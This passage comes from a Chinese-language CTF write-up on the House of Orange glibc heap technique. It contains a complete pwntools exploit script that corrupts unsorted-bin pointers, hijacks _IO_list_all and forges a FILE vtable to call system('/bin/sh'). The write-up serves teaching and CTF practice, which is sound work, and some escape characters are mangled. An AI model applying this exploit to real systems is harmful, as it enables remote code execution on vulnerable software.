             if (last_stamp != _IO_list_all_stamp)
           {
             /* Something was added to the list.  Start all over again.  */
             fp = (_IO_FILE *) _IO_list_all;
             last_stamp = _IO_list_all_stamp;
           }
             else
           fp = fp->_chain;  // B： 这里指向了我们可控的区域，偏移为0x68
           }
从源代码中我们知道__IO_list_all最开始为main_arena的unsorted
bin数组（代码A），不可控，如果我们构造适当的chunk使其在free后存放到了main_arena的unsorted
bin数组偏移的0x68处，这样就可以实现fp指向我们可控的数据（代码B），然后绕过限制条件（代码C），在构造好的IO_FILE里面的vtable（不懂的需要看前面的那篇溢出利用FILE结构体），执行_IO_OVERFLOW（实为system函数地址）函数，fp最开始的数据我们存放“/bin/sh”，所以最终执行system("/bin/sh")，得到shell（代码D）。
**五、exp**
      from pwn import *
      from ctypes import *
      DEBUG = 1
      if DEBUG:
          p = process('./note')
      else:
          #p = remote('106.75.84.74', 10001)
       def add_note(size):
           p.recvuntil('option--->>')
           p.send('1n')
           p.recvuntil('the size:')
           p.send(str(size)+'n')
           data=p.recvuntil('n')
           try:
               ptr=int(data[:-1],16)
           except:
               print data
               return
           return ptr
       def delete_note():
           p.recvuntil('option--->>')
           p.send('4n')
       def edit_note(data):
           if "n" in data:
               print "yes"
           p.recvuntil('option--->>')
           p.send('3n')
           p.recvuntil('content:')
           p.send(data+'n')
       #call free func addr 0x4009AA
       def pwn():
           gdb.attach(p,"b *0x400946")
           mmap=add_note(0x2000000)-0x10
           libc=mmap+0x2001000  #gain the libc address
           system_addr=libc+0x414f0
           io_list=libc+0x3a4040
           main_arena=libc+0x3A3620+88
           log.success("libc = " + hex(libc))
           log.success("system address = " + hex(system_addr))
           log.success("IO_LIST address = " + hex(io_list))
           log.success("main_arena address = " + hex(main_arena - 88))
            delete_note()
            heap=add_note(512)-0x10
            print hex(heap)
            data='a'*0x200+p64(0)+p64(0xdf1)+"x00"*0x18+p64(0x21)  
            edit_note(data)     #make the top chunk size from 0x3000 to 0x1000
            delete_note()
            add_note(0x1000)    #then the top chunk will be freed, it will be puted to unsorted bin chunk
            delete_note()
            add_note(512)
            data="a"*0x200+p64(0)+p64(0xdd1)+p64(main_arena)+p64(main_arena)+'x00'*0xdb0+p64(0)+p64(0x11)
            edit_note(data)
            delete_note()#here, the chunk of 512 bytes will not consolidate with the 0xdd0 chunk, because the prev inuse bit has been set, 0x11
            add_note(528) #this malloc will spilt the 0xdd0 chunk into two chunks, and system may put 512 chunk to the small bin chunk.
            delete_note()# right now ,unsorted bin chunk has two chunk,one is 528,the other one is 0xdd0-528, and small bin chunk has one chunk ,which is 512
            add_note(512)
            data="a"*0x200+p64(0x210)+p64(0x221)+p64(heap+0x430)+p64(main_arena)+'x00'*(0x220-0x20)
            fake_chunk_and_fake_io_list="/bin/shx00" + p64(0x61)+p64(0)+p64(io_list-0x10)#former 32bits is fake chunk
            fake_chunk_and_fake_io_list+=p64(0) #write_base
            fake_chunk_and_fake_io_list+=p64(1) #write_ptr  satisfy fp->_IO_write_ptr > fp->_IO_write_base
            fake_chunk_and_fake_io_list=fake_chunk_and_fake_io_list.ljust(0xc0,'x00')
            fake_chunk_and_fake_io_list+=p64(0xffffffffffffffff)  #here set fp->mode=-1 to bypass the check
            fake_chunk_and_fake_io_list=fake_chunk_and_fake_io_list.ljust(0xd8,'x00')
            vtable=heap+0x10+0x200+0x220+len(fake_chunk_and_fake_io_list)+8
            fake_chunk_and_fake_io_list+=p64(vtable)
            fake_chunk_and_fake_io_list+=p64(0) #dummy 0
            fake_chunk_and_fake_io_list+=p64(0) #dummy 1
            fake_chunk_and_fake_io_list+=p64(1)#finish addr
            fake_chunk_and_fake_io_list+=p64(system_addr) #IO_OVERFLOW
            data+=fake_chunk_and_fake_io_list
            edit_note(data)
            delete_note()
            sleep(0.5)
            add_note(0xb00)
            p.interactive()
        if __name__ == '__main__':
            pwn()
最后再多贴一个代码，我数学不太好，看源代码不容易直接把main_arena里面各个字段的距离算出来，所以就写了个小程序，也一起贴出来吧。
     #include
     #include
     int main()
     {
         FILE *fp;
         fp=stderr;
         int chain=&(fp->_chain);
         int flags=&(fp->_flags);
         int dis=chain-flags;
         printf("FILE struct size: 0x%xn",sizeof(FILE));
         printf("fp->chain - fp: 0x%x %xn",dis);
         int mode=&(fp->_mode);
         dis=mode-flags;
         printf("fp->mode - fp: 0x%xn",dis);
         int write_ptr=&(fp->_IO_write_ptr);
         dis=write_ptr-flags;
         printf("fp->write_ptr - fp: 0x%xn",dis);
         int write_base=&(fp->_IO_write_base);
         dis=write_base-flags;
         printf("fp->write_base - fp: 0x%xn",dis);
         int vtable_offset=&(fp->_vtable_offset);
         dis=vtable_offset-flags;
         printf("fp->vtable_offset - fp: 0x%xn",dis);
         int read_ptr=&(fp->_IO_read_ptr);
         dis=read_ptr-flags;
         printf("fp->read_ptr - fp: 0x%xn",dis);
         return 0;
     }
**六、小结**
本来还想把动态跟踪的图给贴出来的，结果写了一半觉得好像有点累赘，所以又全删掉了，大家自己跟，然后看步骤，应该能看懂吧，看不懂也只能说明我的表达水平有限了，exp里面的注释由于懒得再kali里面又中文输入法，所以就用了蹩脚的英语，大家也将就下，意思应该差不多。
下一步还是想多学点堆的姿势，下一步打算做hctf的第一个pwn好像是double free的，打算学习学习。
**  
**
**七、参考资料**
1、[http://217.logdown.com/](http://217.logdown.com/)
2、[http://4ngelboy.blogspot.jp/2016/10/hitcon-ctf-qual-2016-house-of-orange.html](http://4ngelboy.blogspot.jp/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)
3、[http://osxr.org:8080/glibc/source/malloc/malloc.c#3485](http://osxr.org:8080/glibc/source/malloc/malloc.c#3485)
4、[http://osxr.org:8080/glibc/source/libio/genops.c#0821](http://osxr.org:8080/glibc/source/libio/genops.c#0821)
**堆管理相关的文章：**
1、[Linux堆内存管理深入分析](http://www.cnblogs.com/alisecurity/p/5486458.html)
2、[https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/)
传送门：[【 **溢出利用FILE结构体** ****】](http://bobao.360.cn/learning/detail/3219.html)